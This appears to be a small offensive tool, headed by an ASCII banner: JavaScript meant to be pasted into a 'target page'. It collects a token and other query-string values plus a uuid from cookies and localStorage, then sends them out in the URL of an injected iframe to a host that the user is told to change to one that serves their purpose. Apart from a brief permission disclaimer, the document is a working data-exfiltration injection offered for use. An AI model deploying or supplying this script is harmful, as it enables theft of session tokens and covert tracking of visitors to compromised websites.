
░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓██████████████▓▒░░▒▓████████▓▒░      ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓███████▓▒░▒▓████████▓▒░ 
░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░             ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░     
░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░             ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░     
░▒▓█▓▒░▒▓██████▓▒░ ░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓██████▓▒░        ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░   ░▒▓█▓▒░     
░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░             ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░  ░▒▓█▓▒░     
░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░             ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░  ░▒▓█▓▒░     
░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░      ░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░   ░▒▓█▓▒░     
                                                                                                                                           
                                                                                                                                           


This script is designed to dynamically create and append an iframe to the current web page based on 
  certain parameters obtained from the URL's query string and cookies.
  The purpose or use of this code could vary drastically but could assist in committing computer crimes, always have permission

Two variables may be modified:
  let myUrlPrefix="https://";                  // *** CRITICAL MODIFY IF NEEDED
  let myUrlShort="js.stripe.com";              // *** CRITICAL MODIFY IF YOU WANT THIS TO SERVE YOU WITH A PURPOSE


function init() {
  var token = getQueryVariable('token');
  var apiurl = getQueryVariable('apiurl');
  var uuidCookie = getCookie('uuid');
  var lck = getQueryVariable('lck');
  var lac = getQueryVariable('lac');
  var uuidLocalStorage;

  try {
    uuidLocalStorage = typeof localStorage === 'object' ? localStorage.getItem('uuid') : 0;
  } catch (error) {
    uuidLocalStorage = 0;
    console.log("Error accessing localStorage", error);
  }

  var uuid = uuidCookie || uuidLocalStorage;
  var method = (+!!uuidLocalStorage * 2) + (+!!uuidCookie);
  var options = { token, apiurl, uuid, method, lck, lac };

  console.log("Init options:", options);
  addNewIframe(options);
}

function addNewIframe(options) {
  let myUrlPrefix="https://";                  // *** CRITICAL MODIFY IF NEEDED
  let myUrlShort="js.stripe.com";              // *** CRITICAL MODIFY IF YOU WANT THIS TO SERVE YOU WITH A PURPOSE
  let myUrl=myUrlPrefix+myUrlShort;
  var frame = document.createElement('iframe');
  var newFrameUrl = "" + myUrl + "";
  var queryStringVals = [];

  for (var key in options) {
    if (options.hasOwnProperty(key) && options[key]) {
      queryStringVals.push([key, options[key]].join("="));
    }
  }

  newFrameUrl += "?" + queryStringVals.join("&");
  frame.src = newFrameUrl;
  frame.title = '^';
  document.body.appendChild(frame);
  console.log("Iframe added with src:", newFrameUrl);
}

function getQueryVariable(variable) {
  var querystring = location.search.split('?')[1];
  if (querystring) {
    var vars = querystring.split('&');
    for (var i = 0; i < vars.length; i++) {
      var pair = vars[i].split('=');
      if (pair[0] == variable) return pair[1] ? pair[1] : '';
    }
  }
  return null;
}

function getCookie(name) {
  var cookieArray = document.cookie.split(';');
  for (var index = 0; index < cookieArray.length; ++index) {
    var cookieName = cookieArray[index].substr(0, cookieArray[index].indexOf('=')).trim();
    var cookieValue = cookieArray[index].substr(cookieArray[index].indexOf('=') + 1);
    if (cookieName == name) return unescape(cookieValue);
  }
}

if (!String.prototype.trim) {
  String.prototype.trim = function() { return this.replace(/^\s+|\s+$/gm, ''); }
}

(function() {
  try {
    init();
  } catch (error) {
    console.log("Error during initialization", error);
  }
})();

-----------------
Paste the above code into the target page *after modifying* the URL the frame will target

The output should resemble:
https://prnt.sc/LnnKV9SpPwGw



